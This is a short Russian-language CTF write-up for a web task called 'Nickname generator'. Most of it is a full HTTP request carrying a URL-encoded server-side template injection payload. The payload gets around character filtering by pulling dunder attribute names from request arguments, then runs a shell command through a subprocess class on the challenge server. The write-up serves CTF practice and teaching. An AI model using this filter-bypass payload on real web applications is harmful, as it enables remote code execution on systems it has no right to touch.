# Nickname generator

  - Category: **web**
  - author: @kumfc

> Baba Kapa is going to register a Skype account, but do not really understand how to choose cool and zoomer-styled nickname. 
>We are going to suggest this service as an advice. So, can you look if it works properly? 

> task.pase.ca:24074

### Write-up

Открываем сервис, пробуем потыкать разные символы, понимаем что стоит фильтрация на ".", "_" и "'" и что мы можем проэксплуатировать ssti. Учитывая фильтрацию некоторых символов, раскручиваем до RCE. 
Получаем что-то вроде
>POST / HTTP/1.1
Host: task.pase.ca:24074
User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:68.0) Gecko/20100101 Firefox/68.0
Accept: */*
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate
Referer: http://task.pase.ca:24074/
Content-Type: application/x-www-form-urlencoded; charset=UTF-8
X-Requested-With: XMLHttpRequest
Content-Length: 2773
Connection: keep-alive
Cookie: PHPSESSID=o705deb2ok30r83u7co9flcokn

>nickname=%7b%7b%20%28%28%28%28%32%7c%73%74%72%69%6e%67%7c%61%74%74%72%28%20%20%20%28%72%65%71%75%65%73%74%7c%61%74%74%72%28%5b%5b%5d%7c%6d%61%70%7c%73%74%72%69%6e%67%7c%6c%69%73%74%5d%5b%30%5d%5b%33%31%5d%20%2b%20%5b%5b%5d%7c%6d%61%70%7c%73%74%72%69%6e%67%7c%6c%69%73%74%5d%5b%30%5d%5b%31%39%5d%20%2b%20%5b%5b%5d%7c%6d%61%70%7c%73%74%72%69%6e%67%7c%6c%69%73%74%5d%5b%30%5d%5b%39%5d%2b%5b%5b%5d%7c%6d%61%70%7c%73%74%72%69%6e%67%7c%6c%69%73%74%5d%5b%30%5d%5b%32%31%5d%29%29%5b%5b%5b%5d%7c%6d%61%70%7c%73%74%72%69%6e%67%7c%6c%69%73%74%5d%5b%30%5d%5b%31%5d%5d%20%20%20%29%29%7c%61%74%74%72%28%20%20%28%72%65%71%75%65%73%74%7c%61%74%74%72%28%5b%5b%5d%7c%6d%61%70%7c%73%74%72%69%6e%67%7c%6c%69%73%74%5d%5b%30%5d%5b%33%31%5d%20%2b%20%5b%5b%5d%7c%6d%61%70%7c%73%74%72%69%6e%67%7c%6c%69%73%74%5d%5b%30%5d%5b%31%39%5d%20%2b%20%5b%5b%5d%7c%6d%61%70%7c%73%74%72%69%6e%67%7c%6c%69%73%74%5d%5b%30%5d%5b%39%5d%2b%5b%5b%5d%7c%6d%61%70%7c%73%74%72%69%6e%67%7c%6c%69%73%74%5d%5b%30%5d%5b%32%31%5d%29%29%5b%5b%5b%5d%7c%6d%61%70%7c%73%74%72%69%6e%67%7c%6c%69%73%74%5d%5b%30%5d%5b%32%5d%5d%20%20%29%29%5b%31%5d%7c%61%74%74%72%28%20%20%28%72%65%71%75%65%73%74%7c%61%74%74%72%28%5b%5b%5d%7c%6d%61%70%7c%73%74%72%69%6e%67%7c%6c%69%73%74%5d%5b%30%5d%5b%33%31%5d%20%2b%20%5b%5b%5d%7c%6d%61%70%7c%73%74%72%69%6e%67%7c%6c%69%73%74%5d%5b%30%5d%5b%31%39%5d%20%2b%20%5b%5b%5d%7c%6d%61%70%7c%73%74%72%69%6e%67%7c%6c%69%73%74%5d%5b%30%5d%5b%39%5d%2b%5b%5b%5d%7c%6d%61%70%7c%73%74%72%69%6e%67%7c%6c%69%73%74%5d%5b%30%5d%5b%32%31%5d%29%29%5b%5b%5b%5d%7c%6d%61%70%7c%73%74%72%69%6e%67%7c%6c%69%73%74%5d%5b%30%5d%5b%33%5d%5d%20%20%29%29%28%29%5b%32%38%36%5d%28%5b%20%20%28%72%65%71%75%65%73%74%7c%61%74%74%72%28%5b%5b%5d%7c%6d%61%70%7c%73%74%72%69%6e%67%7c%6c%69%73%74%5d%5b%30%5d%5b%33%31%5d%20%2b%20%5b%5b%5d%7c%6d%61%70%7c%73%74%72%69%6e%67%7c%6c%69%73%74%5d%5b%30%5d%5b%31%39%5d%20%2b%20%5b%5b%5d%7c%6d%61%70%7c%73%74%72%69%6e%67%7c%6c%69%73%74%5d%5b%30%5d%5b%39%5d%2b%5b%5b%5d%7c%6d%61%70%7c%73%74%72%69%6e%67%7c%6c%69%73%74%5d%5b%30%5d%5b%32%31%5d%29%29%5b%5b%5b%5d%7c%6d%61%70%7c%73%74%72%69%6e%67%7c%6c%69%73%74%5d%5b%30%5d%5b%35%5d%5d%20%20%5d%2c%20%73%68%65%6c%6c%3d%54%72%75%65%2c%20%73%74%64%6f%75%74%3d%2d%31%29%29%20%7c%20%61%74%74%72%28%20%20%28%72%65%71%75%65%73%74%7c%61%74%74%72%28%5b%5b%5d%7c%6d%61%70%7c%73%74%72%69%6e%67%7c%6c%69%73%74%5d%5b%30%5d%5b%33%31%5d%20%2b%20%5b%5b%5d%7c%6d%61%70%7c%73%74%72%69%6e%67%7c%6c%69%73%74%5d%5b%30%5d%5b%31%39%5d%20%2b%20%5b%5b%5d%7c%6d%61%70%7c%73%74%72%69%6e%67%7c%6c%69%73%74%5d%5b%30%5d%5b%39%5d%2b%5b%5b%5d%7c%6d%61%70%7c%73%74%72%69%6e%67%7c%6c%69%73%74%5d%5b%30%5d%5b%32%31%5d%29%29%5b%5b%5b%5d%7c%6d%61%70%7c%73%74%72%69%6e%67%7c%6c%69%73%74%5d%5b%30%5d%5b%36%5d%5d%20%29%28%29%20%7d%7d&g=__class__&e=__mro__&n=__subclasses__&r=ls&a=communicate

Смотрим исходники сервиса, расшифровываем флаг.
